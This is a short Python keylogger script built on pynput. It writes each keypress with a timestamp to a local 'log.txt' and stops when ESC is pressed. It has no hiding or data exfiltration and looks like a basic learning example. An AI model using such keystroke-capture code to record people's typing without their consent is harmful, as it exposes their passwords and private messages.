from pynput import keyboard
import datetime

log = 'log.txt'

def on_press(key):
    """Logs keypress events to a file with timestamp.
    Args:
        key (pynput.keyboard.Key): The key that was pressed.

    Returns:
        bool: False if ESC key is pressed (to stop the listener), None otherwise.
    """
    timeStamp = datetime.datetime.now()
    
    if hasattr(key, "char") and key.char is not None:
        keyRepr = key.char
    else:
        keyRepr = str(key)
    
    with open(log, 'a') as file:
        try:
            file.write(f'\n {timeStamp}   | Pressed:  [ {keyRepr} ]')
        except AttributeError:  
            file.write(f'\n {timeStamp}   | Pressed:  [ {keyRepr} ]')
    
    if key == keyboard.Key.esc:
        return False
    
with keyboard.Listener(on_press=on_press) as listener:
   listener.join()